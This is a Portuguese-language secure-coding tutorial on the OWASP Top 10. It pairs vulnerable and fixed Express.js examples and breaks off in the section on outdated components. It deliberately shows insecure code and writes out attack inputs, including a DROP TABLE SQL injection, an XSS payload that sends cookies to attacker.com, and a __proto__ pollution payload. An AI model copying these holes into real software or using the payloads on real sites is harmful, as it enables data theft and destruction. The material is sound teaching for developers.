# Documentação OWASP Top 10 - Guia Completo com JavaScript

## 📚 Índice

1. [Broken Access Control (Controle de Acesso Quebrado)](#1-broken-access-control)
2. [Cryptographic Failures (Falhas Criptográficas)](#2-cryptographic-failures)
3. [Injection (Injeção)](#3-injection)
4. [Insecure Design (Design Inseguro)](#4-insecure-design)
5. [Security Misconfiguration (Configuração de Segurança Incorreta)](#5-security-misconfiguration)
6. [Vulnerable and Outdated Components (Componentes Vulneráveis e Desatualizados)](#6-vulnerable-and-outdated-components)
7. [Identification and Authentication Failures (Falhas de Identificação e Autenticação)](#7-identification-and-authentication-failures)
8. [Software and Data Integrity Failures (Falhas de Integridade de Software e Dados)](#8-software-and-data-integrity-failures)
9. [Security Logging and Monitoring Failures (Falhas de Log e Monitoramento)](#9-security-logging-and-monitoring-failures)
10. [Server-Side Request Forgery (SSRF)](#10-server-side-request-forgery)

---

## 1. Broken Access Control

### 🎭 Explicação Lúdica

Imagine que você está em um prédio de apartamentos. O Controle de Acesso Quebrado é como se o porteiro não verificasse os cartões dos visitantes - qualquer pessoa poderia entrar em qualquer apartamento apenas mudando o número do andar no elevador. Um usuário comum poderia acessar a área VIP ou até mesmo o painel do administrador!

### 🎯 O que é?

Broken Access Control ocorre quando usuários podem acessar recursos ou executar ações para as quais não têm permissão. É a vulnerabilidade número 1 do OWASP Top 10 2021, responsável por 61% de todas as violações de segurança.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Não faça isso!
const express = require('express');
const app = express();

// Endpoint vulnerável - qualquer usuário pode acessar qualquer conta
app.get('/api/account', (req, res) => {
  const accountId = req.query.id; // Recebe o ID da URL
  
  // Busca a conta diretamente sem verificação
  const account = database.getAccount(accountId);
  
  res.json(account); // Retorna os dados sensíveis
});

// URL vulnerável: https://exemplo.com/api/account?id=123
// Atacante pode trocar para: https://exemplo.com/api/account?id=456
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Faça isso!
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

// Middleware de autenticação
function authenticateToken(req, res, next) {
  const token = req.headers['authorization'];
  
  if (!token) {
    return res.status(401).json({ error: 'Token não fornecido' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Token inválido' });
    }
    req.user = user;
    next();
  });
}

// Middleware de verificação de autorização
function checkAccountOwnership(req, res, next) {
  const accountId = req.query.id;
  const userId = req.user.id;
  
  // Verifica se o usuário tem permissão para acessar esta conta
  if (!hasPermission(userId, accountId)) {
    return res.status(403).json({ error: 'Acesso negado' });
  }
  
  next();
}

// Endpoint seguro com verificações de autenticação e autorização
app.get('/api/account', 
  authenticateToken, 
  checkAccountOwnership, 
  (req, res) => {
    const accountId = req.query.id;
    const account = database.getAccount(accountId);
    
    // Remove dados sensíveis antes de retornar
    const safeAccount = {
      id: account.id,
      name: account.name,
      balance: account.balance
      // Não retorna: senha, CPF, etc.
    };
    
    res.json(safeAccount);
});

// Função auxiliar para verificar permissões
function hasPermission(userId, accountId) {
  const account = database.getAccount(accountId);
  return account.ownerId === userId;
}
```

### 🛡️ Como Prevenir

1. **Negue por padrão**: Bloqueie tudo exceto recursos públicos
2. **Implemente controles de acesso**: Use RBAC (Role-Based Access Control) ou ABAC (Attribute-Based Access Control)
3. **Valide propriedade**: Sempre verifique se o usuário é dono do recurso
4. **Desabilite directory listing**: Não exponha estruturas de diretórios
5. **Invalide tokens JWT**: Após logout ou mudanças críticas
6. **Limite chamadas à API**: Implemente rate limiting

---

## 2. Cryptographic Failures

### 🎭 Explicação Lúdica

Pense em Falhas Criptográficas como enviar cartões postais com seus segredos escritos sem envelope. Qualquer pessoa que intercepte a mensagem pode ler tudo! Ou pior: você coloca a mensagem em um envelope de papel de seda que qualquer um pode ver através dele. A criptografia correta é como usar um cofre de aço para proteger suas informações.

### 🎯 O que é?

Cryptographic Failures (anteriormente conhecida como "Sensitive Data Exposure") ocorre quando dados sensíveis não são adequadamente protegidos através de criptografia, ou quando algoritmos criptográficos fracos são utilizados.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Não faça isso!
const express = require('express');
const crypto = require('crypto');
const app = express();

// ERRO 1: Armazenar senha em texto plano
app.post('/register', (req, res) => {
  const { username, password, creditCard } = req.body;
  
  // MUITO PERIGOSO! Senha em texto plano
  const user = {
    username: username,
    password: password, // ❌ Texto plano
    creditCard: creditCard // ❌ Dados sensíveis sem criptografia
  };
  
  database.saveUser(user);
  res.json({ message: 'Usuário registrado' });
});

// ERRO 2: Usar algoritmos fracos
function encryptData(text) {
  const cipher = crypto.createCipher('des', 'weak-key'); // ❌ DES é fraco
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// ERRO 3: Chaves hardcoded no código
const API_KEY = 'minha-chave-secreta-123'; // ❌ Exposto no código

// ERRO 4: Transmitir dados sensíveis via HTTP (não HTTPS)
app.get('/api/user-data', (req, res) => {
  const userData = {
    ssn: '123-45-6789', // ❌ Enviado sem criptografia
    creditCard: '4532-1111-2222-3333'
  };
  res.json(userData);
});
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Faça isso!
const express = require('express');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
require('dotenv').config();
const app = express();

// Configuração
const SALT_ROUNDS = 12;
const ALGORITHM = 'aes-256-gcm';

// Função para criptografar dados sensíveis
function encryptData(text) {
  // Usa chave forte do ambiente
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
  const iv = crypto.randomBytes(16);
  
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  return {
    encrypted: encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

// Função para descriptografar dados
function decryptData(encryptedData) {
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
  const iv = Buffer.from(encryptedData.iv, 'hex');
  const authTag = Buffer.from(encryptedData.authTag, 'hex');
  
  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  decipher.setAuthTag(authTag);
  
  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Registro seguro com hash de senha
app.post('/register', async (req, res) => {
  try {
    const { username, password, creditCard } = req.body;
    
    // Hash da senha com bcrypt
    const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
    
    // Criptografa o cartão de crédito
    const encryptedCreditCard = encryptData(creditCard);
    
    const user = {
      username: username,
      password: hashedPassword, // ✅ Hash seguro
      creditCard: encryptedCreditCard // ✅ Dados criptografados
    };
    
    await database.saveUser(user);
    res.json({ message: 'Usuário registrado com segurança' });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro no registro' });
  }
});

// Login com verificação segura
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    const user = await database.getUserByUsername(username);
    
    if (!user) {
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    // Compara a senha com bcrypt
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    res.json({ message: 'Login bem-sucedido' });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro no login' });
  }
});

// Endpoint HTTPS com dados sensíveis
app.get('/api/user-data', authenticateToken, (req, res) => {
  // Somente via HTTPS em produção
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.status(403).json({ error: 'HTTPS obrigatório' });
  }
  
  const user = database.getUser(req.user.id);
  
  // Descriptografa dados sensíveis apenas quando necessário
  const decryptedCreditCard = decryptData(user.creditCard);
  
  // Mascarar dados sensíveis antes de enviar
  const maskedCard = '**** **** **** ' + decryptedCreditCard.slice(-4);
  
  res.json({
    username: user.username,
    creditCard: maskedCard // ✅ Mascarado
  });
});
```

### 🛡️ Como Prevenir

1. **Classifique dados**: Identifique quais dados são sensíveis
2. **Criptografe dados em repouso**: Use AES-256 para armazenamento
3. **Criptografe dados em trânsito**: Use TLS 1.3 ou superior
4. **Use algoritmos fortes**: bcrypt, scrypt ou Argon2 para senhas
5. **Gerencie chaves adequadamente**: Use variáveis de ambiente, nunca hardcode
6. **Implemente Perfect Forward Secrecy**: Use ephemeral keys
7. **Desabilite cache para dados sensíveis**: Use cabeçalhos HTTP apropriados

---

## 3. Injection

### 🎭 Explicação Lúdica

Injection é como deixar um formulário em branco para alguém preencher, mas sem verificar o que foi escrito. O atacante, em vez de escrever "João Silva", escreve "João Silva; DELETE FROM users;" e de repente todos os usuários são apagados! É como um cavalo de Troia disfarçado de entrada normal.

### 🎯 O que é?

Injection (especialmente SQL Injection e XSS) ocorre quando dados não confiáveis são enviados para um interpretador como parte de um comando ou consulta. Os dados maliciosos podem enganar o interpretador para executar comandos não intencionais.

### ❌ Exemplo Vulnerável - SQL Injection

```javascript
// Código VULNERÁVEL - SQL Injection
const express = require('express');
const mysql = require('mysql');
const app = express();

const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'myapp'
});

// VULNERÁVEL a SQL Injection
app.get('/search', (req, res) => {
  const userInput = req.query.name;
  
  // ❌ Concatenação direta - MUITO PERIGOSO!
  const query = `SELECT * FROM users WHERE name = '${userInput}'`;
  
  connection.query(query, (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});

// Ataque possível:
// /search?name='; DROP TABLE users; --
// Query resultante: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

### ❌ Exemplo Vulnerável - XSS (Cross-Site Scripting)

```javascript
// Código VULNERÁVEL - XSS
app.get('/profile', (req, res) => {
  const username = req.query.name;
  
  // ❌ Inserir dados do usuário diretamente no HTML
  res.send(`
    <html>
      <body>
        <h1>Bem-vindo, ${username}!</h1>
      </body>
    </html>
  `);
});

// Ataque possível:
// /profile?name=<script>alert('XSS!');</script>
// ou pior:
// /profile?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### ✅ Solução Segura - SQL Injection

```javascript
// Código SEGURO - Prevenção de SQL Injection
const express = require('express');
const mysql = require('mysql2/promise');
const app = express();

// Método 1: Prepared Statements (Consultas Parametrizadas)
app.get('/search', async (req, res) => {
  try {
    const userInput = req.query.name;
    
    // ✅ Usa placeholders (?) para parâmetros
    const query = 'SELECT * FROM users WHERE name = ?';
    
    const [results] = await connection.query(query, [userInput]);
    
    res.json(results);
  } catch (error) {
    res.status(500).json({ error: 'Erro na busca' });
  }
});

// Método 2: ORM (Object-Relational Mapping) - Sequelize
const { Sequelize, DataTypes } = require('sequelize');
const sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'mysql'
});

// Define o modelo
const User = sequelize.define('User', {
  name: DataTypes.STRING,
  email: DataTypes.STRING
});

app.get('/search-safe', async (req, res) => {
  try {
    const userInput = req.query.name;
    
    // ✅ O Sequelize escapa automaticamente os valores
    const users = await User.findAll({
      where: {
        name: userInput
      }
    });
    
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: 'Erro na busca' });
  }
});

// Método 3: Validação e Sanitização
const { body, validationResult } = require('express-validator');

app.post('/create-user',
  // Valida e sanitiza os inputs
  body('name').trim().escape().isAlphanumeric(),
  body('email').isEmail().normalizeEmail(),
  async (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    const { name, email } = req.body;
    
    // Agora é seguro usar os dados
    const query = 'INSERT INTO users (name, email) VALUES (?, ?)';
    await connection.query(query, [name, email]);
    
    res.json({ message: 'Usuário criado com sucesso' });
  }
);
```

### ✅ Solução Segura - XSS

```javascript
// Código SEGURO - Prevenção de XSS
const express = require('express');
const DOMPurify = require('isomorphic-dompurify');
const helmet = require('helmet');
const app = express();

// Método 1: Use helmet para headers de segurança
app.use(helmet());

// Método 2: Sanitize HTML com DOMPurify
app.get('/profile', (req, res) => {
  const username = req.query.name;
  
  // ✅ Sanitiza o input antes de usar
  const cleanUsername = DOMPurify.sanitize(username);
  
  res.send(`
    <html>
      <head>
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'self'; script-src 'self'">
      </head>
      <body>
        <h1>Bem-vindo, ${cleanUsername}!</h1>
      </body>
    </html>
  `);
});

// Método 3: Use textContent em vez de innerHTML no cliente
app.get('/safe-client', (req, res) => {
  res.send(`
    <html>
      <body>
        <h1 id="welcome"></h1>
        <script>
          // ✅ textContent não executa scripts
          const username = new URLSearchParams(window.location.search).get('name');
          document.getElementById('welcome').textContent = 'Bem-vindo, ' + username;
        </script>
      </body>
    </html>
  `);
});

// Método 4: Escape manual de caracteres especiais
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.get('/manual-escape', (req, res) => {
  const username = req.query.name;
  const safeUsername = escapeHtml(username);
  
  res.send(`
    <html>
      <body>
        <h1>Bem-vindo, ${safeUsername}!</h1>
      </body>
    </html>
  `);
});

// Método 5: Content Security Policy (CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

### 🛡️ Como Prevenir

1. **Use Prepared Statements**: Para todas as queries de banco de dados
2. **Valide inputs**: Use bibliotecas como express-validator
3. **Sanitize outputs**: Use DOMPurify para HTML
4. **Implemente CSP**: Content Security Policy headers
5. **Use ORMs**: Sequelize, TypeORM, Mongoose
6. **Escape caracteres especiais**: Antes de renderizar
7. **Nunca use eval()**: Ou Function() com dados não confiáveis

---

## 4. Insecure Design

### 🎭 Explicação Lúdica

Insecure Design é como construir uma casa sem pensar onde colocar as portas e janelas. Você pode ter as melhores fechaduras do mundo, mas se colocou a porta do cofre na parede externa da casa, qualquer um pode simplesmente quebrá-la. É sobre planejar a segurança desde o início, não tentar adicionar depois.

### 🎯 O que é?

Insecure Design representa falhas no design e arquitetura da aplicação. Diferente de uma implementação defeituosa, aqui o problema está na concepção. Uma implementação perfeita não pode corrigir um design inseguro.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Design Inseguro
const express = require('express');
const app = express();

// PROBLEMA 1: Sem limite de tentativas de login
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await database.findUser(username);
  
  if (user && user.password === password) {
    return res.json({ success: true, token: generateToken(user) });
  }
  
  // ❌ Nenhuma proteção contra brute force
  res.status(401).json({ error: 'Credenciais inválidas' });
});

// PROBLEMA 2: Sem validação de regras de negócio
app.post('/transfer', async (req, res) => {
  const { from, to, amount } = req.body;
  
  // ❌ Não verifica se o usuário tem saldo suficiente
  // ❌ Não verifica limites diários
  // ❌ Não implementa autenticação de dois fatores para valores altos
  
  await database.transfer(from, to, amount);
  res.json({ success: true });
});

// PROBLEMA 3: Funcionalidade de recuperação de senha insegura
app.post('/forgot-password', async (req, res) => {
  const { email } = req.body;
  
  const user = await database.findUserByEmail(email);
  
  if (user) {
    // ❌ Envia a senha atual por email
    sendEmail(email, `Sua senha é: ${user.password}`);
  }
  
  // ❌ Revela se o email existe ou não
  res.json({ message: 'Senha enviada' });
});
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Design Seguro com Threat Modeling
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Solução 1: Rate Limiting para prevenir brute force
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // Máximo 5 tentativas
  message: 'Muitas tentativas de login. Tente novamente em 15 minutos.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Sistema de bloqueio progressivo
const loginAttempts = new Map();

app.post('/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  const ip = req.ip;
  
  // Verifica tentativas anteriores
  const attempts = loginAttempts.get(ip) || { count: 0, lastAttempt: Date.now() };
  
  // Bloqueio progressivo: aumenta o tempo de espera a cada falha
  if (attempts.count >= 3) {
    const waitTime = Math.pow(2, attempts.count - 3) * 1000; // Exponencial
    const timeSinceLastAttempt = Date.now() - attempts.lastAttempt;
    
    if (timeSinceLastAttempt < waitTime) {
      return res.status(429).json({
        error: `Muitas tentativas. Aguarde ${Math.ceil((waitTime - timeSinceLastAttempt) / 1000)}s`
      });
    }
  }
  
  const user = await database.findUser(username);
  const bcrypt = require('bcrypt');
  
  if (!user || !(await bcrypt.compare(password, user.password))) {
    // Incrementa tentativas falhas
    loginAttempts.set(ip, {
      count: attempts.count + 1,
      lastAttempt: Date.now()
    });
    
    // ✅ Mensagem genérica (não revela se usuário existe)
    return res.status(401).json({ error: 'Credenciais inválidas' });
  }
  
  // Reseta contador em caso de sucesso
  loginAttempts.delete(ip);
  
  res.json({ success: true, token: generateToken(user) });
});

// Solução 2: Validação robusta de regras de negócio
app.post('/transfer', authenticateToken, async (req, res) => {
  const { to, amount } = req.body;
  const from = req.user.id;
  
  try {
    // ✅ Validação de entrada
    if (amount <= 0 || amount > 100000) {
      return res.status(400).json({ error: 'Valor inválido' });
    }
    
    // ✅ Verifica saldo
    const account = await database.getAccount(from);
    if (account.balance < amount) {
      return res.status(400).json({ error: 'Saldo insuficiente' });
    }
    
    // ✅ Verifica limite diário
    const todayTransfers = await database.getTodayTransfers(from);
    const totalToday = todayTransfers.reduce((sum, t) => sum + t.amount, 0);
    
    if (totalToday + amount > account.dailyLimit) {
      return res.status(400).json({ error: 'Limite diário excedido' });
    }
    
    // ✅ Requer 2FA para valores altos
    if (amount > 5000 && !req.body.twoFactorCode) {
      return res.status(400).json({ 
        error: 'Autenticação de dois fatores necessária',
        requires2FA: true 
      });
    }
    
    if (req.body.twoFactorCode) {
      const isValid = await verify2FA(req.user.id, req.body.twoFactorCode);
      if (!isValid) {
        return res.status(401).json({ error: 'Código 2FA inválido' });
      }
    }
    
    // ✅ Transação atômica
    await database.transaction(async (trx) => {
      await trx.debit(from, amount);
      await trx.credit(to, amount);
      await trx.logTransfer(from, to, amount);
    });
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro na transferência' });
  }
});

// Solução 3: Recuperação de senha segura
const crypto = require('crypto');
const resetTokens = new Map(); // Em produção, use Redis

app.post('/forgot-password', rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hora
  max: 3 // Máximo 3 requisições por hora
}), async (req, res) => {
  const { email } = req.body;
  
  const user = await database.findUserByEmail(email);
  
  // ✅ Sempre retorna a mesma mensagem (não revela se email existe)
  const message = 'Se o email existir, você receberá instruções para redefinir a senha';
  
  if (user) {
    // ✅ Gera token seguro e temporário
    const resetToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');
    
    // ✅ Token expira em 1 hora
    resetTokens.set(hashedToken, {
      userId: user.id,
      expires: Date.now() + 3600000
    });
    
    // ✅ Envia link de reset (não a senha)
    const resetUrl = `https://example.com/reset-password?token=${resetToken}`;
    await sendEmail(email, `Clique aqui para redefinir sua senha: ${resetUrl}`);
  }
  
  res.json({ message });
});

// Endpoint para redefinir senha com token
app.post('/reset-password', async (req, res) => {
  const { token, newPassword } = req.body;
  
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');
  const tokenData = resetTokens.get(hashedToken);
  
  if (!tokenData || tokenData.expires < Date.now()) {
    return res.status(400).json({ error: 'Token inválido ou expirado' });
  }
  
  // ✅ Valida força da nova senha
  const passwordValidator = require('owasp-password-strength-test');
  const result = passwordValidator.test(newPassword);
  
  if (!result.strong) {
    return res.status(400).json({ error: result.errors });
  }
  
  // ✅ Atualiza senha com hash
  const bcrypt = require('bcrypt');
  const hashedPassword = await bcrypt.hash(newPassword, 12);
  
  await database.updatePassword(tokenData.userId, hashedPassword);
  resetTokens.delete(hashedToken);
  
  res.json({ message: 'Senha redefinida com sucesso' });
});
```

### 🛡️ Como Prevenir

1. **Threat Modeling**: Identifique ameaças na fase de design
2. **User Stories**: Crie histórias de usuário e atacante
3. **Secure Development Lifecycle**: Integre segurança em todo o ciclo
4. **Principle of Least Privilege**: Conceda apenas permissões necessárias
5. **Defense in Depth**: Múltiplas camadas de segurança
6. **Fail Securely**: Falhas devem ser seguras por padrão
7. **Separation of Duties**: Separe funções críticas

---

## 5. Security Misconfiguration

### 🎭 Explicação Lúdica

Security Misconfiguration é como comprar uma casa de alta segurança mas deixar a chave debaixo do tapete, as janelas abertas e o alarme desligado. Você tem todos os recursos de segurança, mas configurou tudo errado! É a diferença entre ter segurança e usar segurança corretamente.

### 🎯 O que é?

Security Misconfiguration ocorre quando configurações de segurança são definidas incorretamente ou deixadas nos valores padrão inseguros. Afeta qualquer camada: aplicação, servidor web, banco de dados, frameworks e bibliotecas.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Configurações Inseguras
const express = require('express');
const app = express();

// ERRO 1: Informações sensíveis expostas
app.get('/debug', (req, res) => {
  // ❌ Endpoint de debug exposto em produção
  res.json({
    environment: process.env,
    database: 'mongodb://admin:password@localhost:27017',
    apiKeys: {
      stripe: 'sk_live_abc123',
      aws: 'AKIAIOSFODNN7EXAMPLE'
    }
  });
});

// ERRO 2: CORS mal configurado
app.use((req, res, next) => {
  // ❌ Permite qualquer origem
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

// ERRO 3: Headers de segurança ausentes
// ❌ Sem X-Content-Type-Options
// ❌ Sem X-Frame-Options
// ❌ Sem Strict-Transport-Security

// ERRO 4: Logs com informações sensíveis
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // ❌ Loga senha em texto plano
  console.log(`Login attempt: ${username}/${password}`);
  
  // ❌ Stacktrace exposto ao cliente
  try {
    authenticateUser(username, password);
  } catch (error) {
    res.status(500).json({
      error: error.message,
      stack: error.stack // ❌ Expõe estrutura interna
    });
  }
});

// ERRO 5: Sessões inseguras
const session = require('express-session');
app.use(session({
  secret: 'keyboard cat', // ❌ Secret fraco e hardcoded
  resave: true,
  saveUninitialized: true,
  cookie: {
    secure: false, // ❌ Permite HTTP (não apenas HTTPS)
    httpOnly: false, // ❌ Acessível via JavaScript
    maxAge: 365 * 24 * 60 * 60 * 1000 // ❌ 1 ano é muito tempo
  }
}));

// ERRO 6: Arquivos desnecessários expostos
// ❌ .git/ acessível
// ❌ package.json exposto
// ❌ .env files acessíveis
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Configurações Corretas
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const winston = require('winston');
require('dotenv').config();

const app = express();

// Solução 1: Remova/Proteja endpoints de debug
if (process.env.NODE_ENV === 'production') {
  // ✅ Debug desabilitado em produção
} else {
  // Debug somente em desenvolvimento e com autenticação
  app.get('/debug', requireAdmin, (req, res) => {
    res.json({
      environment: process.env.NODE_ENV,
      // Nunca exponha credenciais
      version: process.env.APP_VERSION
    });
  });
}

// Solução 2: CORS configurado corretamente
const corsOptions = {
  // ✅ Lista específica de origens permitidas
  origin: function (origin, callback) {
    const allowedOrigins = [
      'https://www.meusite.com',
      'https://app.meusite.com'
    ];
    
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'], // ✅ Métodos específicos
  allowedHeaders: ['Content-Type', 'Authorization'], // ✅ Headers específicos
  credentials: true, // ✅ Permite cookies
  maxAge: 86400 // ✅ Cache por 24 horas
};

app.use(cors(corsOptions));

// Solução 3: Headers de segurança com Helmet
app.use(helmet({
  // ✅ Protege contra clickjacking
  frameguard: { action: 'deny' },
  
  // ✅ Previne MIME type sniffing
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  
  // ✅ Force HTTPS
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// Headers adicionais
app.use((req, res, next) => {
  // ✅ Previne informação de versão
  res.removeHeader('X-Powered-By');
  
  // ✅ Política de referrer
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // ✅ Política de permissões
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  next();
});

// Solução 4: Logging seguro e estruturado
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    // ✅ Logs de erro em arquivo separado
    new winston.transports.File({ 
      filename: 'error.log', 
      level: 'error' 
    }),
    // ✅ Todos os logs em arquivo combinado
    new winston.transports.File({ 
      filename: 'combined.log' 
    })
  ]
});

// Não loga em arquivos em desenvolvimento
if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.simple()
  }));
}

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  try {
    const result = authenticateUser(username, password);
    
    // ✅ Log sem informações sensíveis
    logger.info('Login attempt', {
      username: username,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success: !!result
    });
    
    if (result) {
      res.json({ success: true });
    } else {
      res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
  } catch (error) {
    // ✅ Log detalhado apenas no servidor
    logger.error('Login error', {
      username: username,
      error: error.message,
      stack: error.stack
    });
    
    // ✅ Mensagem genérica para o cliente
    res.status(500).json({ 
      error: 'Erro interno do servidor' 
    });
  }
});

// Solução 5: Sessões seguras
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

// Cliente Redis para armazenar sessões
const redisClient = createClient({
  url: process.env.REDIS_URL
});
redisClient.connect().catch(console.error);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  
  // ✅ Secret forte do ambiente
  secret: process.env.SESSION_SECRET,
  
  resave: false,
  saveUninitialized: false,
  
  cookie: {
    // ✅ Somente HTTPS em produção
    secure: process.env.NODE_ENV === 'production',
    
    // ✅ Não acessível via JavaScript
    httpOnly: true,
    
    // ✅ Proteção CSRF
    sameSite: 'strict',
    
    // ✅ Sessão expira em 1 hora
    maxAge: 60 * 60 * 1000
  },
  
  // ✅ Regenera ID de sessão após login
  name: 'sessionId' // Nome customizado (não padrão)
}));

// Regenerar sessão após login
app.post('/login-secure', (req, res) => {
  const { username, password } = req.body;
  
  if (authenticateUser(username, password)) {
    // ✅ Regenera o ID da sessão
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao criar sessão' });
      }
      
      req.session.user = { username };
      res.json({ success: true });
    });
  } else {
    res.status(401).json({ error: 'Credenciais inválidas' });
  }
});

// Solução 6: Proteger arquivos sensíveis
// .gitignore
/*
node_modules/
.env
.env.*
*.log
.DS_Store
coverage/
dist/
build/
*/

// nginx.conf - Bloqueia acesso a arquivos sensíveis
/*
location ~ /\. {
  deny all;
  access_log off;
  log_not_found off;
}

location ~* \.(env|git|svn|bak|log)$ {
  deny all;
  access_log off;
  log_not_found off;
}
*/
```

### 🛡️ Como Prevenir

1. **Remova recursos desnecessários**: Features, páginas, contas padrão
2. **Use configurações seguras**: Revise todas as configurações
3. **Mantenha atualizado**: Patches de segurança regularmente
4. **Segmente ambientes**: Separação entre dev, staging e produção
5. **Automatize configuração**: Infrastructure as Code
6. **Audite regularmente**: Scans de segurança automatizados
7. **Mínimo privilégio**: Conceda apenas permissões necessárias

---

## 6. Vulnerable and Outdated Components

### 🎭 Explicação Lúdica

Componentes Vulneráveis e Desatualizados é como usar um carro de 20 anos sem nunca ter feito manutenção. As peças estão desgastadas, há falhas conhecidas, e todo mecânico sabe exatamente quais problemas esperar. Os hackers têm um manual de todos os bugs conhecidos de versões antigas!

### 🎯 O que é?

Usar componentes (bibliotecas, frameworks, módulos) com vulnerabilidades conhecidas ou desatualizados é uma das formas mais comuns de comprometimento. A maioria dos desenvolvedores não sabe quais versões de componentes estão usando ou se estão vulneráveis.

### ❌ Exemplo Vulnerável

```javascript
// package.json VULNERÁVEL - Versões desatualizadas
{
  "name": "my-vulnerable-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "3.0.0",        // ❌ Muito desatualizado (versão de 2012!)
    "lodash": "4.17.15",       // ❌ Vulnerável (CVE-2020-8203)
    "axios": "0.19.0",         // ❌ Vulnerável (CVE-2020-28168)
    "jsonwebtoken": "8.0.0",   // ❌ Vulnerável (CVE-2022-23529)
    "mongoose": "5.0.0",       // ❌ Versão antiga
    "dotenv": "6.0.0"          // ❌ Versão antiga
  }
}

// Código usando componente vulnerável
const _ = require('lodash');

// ❌ Lodash 4.17.15 é vulnerável a Prototype Pollution
app.post('/update-settings', (req, res) => {
  const userSettings = {};
  
  // Permite que atacante manipule o prototype
  _.merge(userSettings, req.body);
  
  // Ataque: {"__proto__": {"isAdmin": true}}
  // Agora TODOS os objetos têm isAdmin: true!
  
  res.json(userSettings);
});
```

### ✅ Solução Segura

```javascript
// package.json SEGURO - Versões atualizadas
{
  "name": "my-secure-app",
  "version": "1.0.0",
  "dependencies": {
    // ✅ Versões atualizadas e seguras
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "axios": "^1.6.0",
    "jsonwebtoken": "^9.0.2",
    "mongoose": "^7.6.0",
    "dotenv": "^16.3.1"
  },
  "devDependencies": {
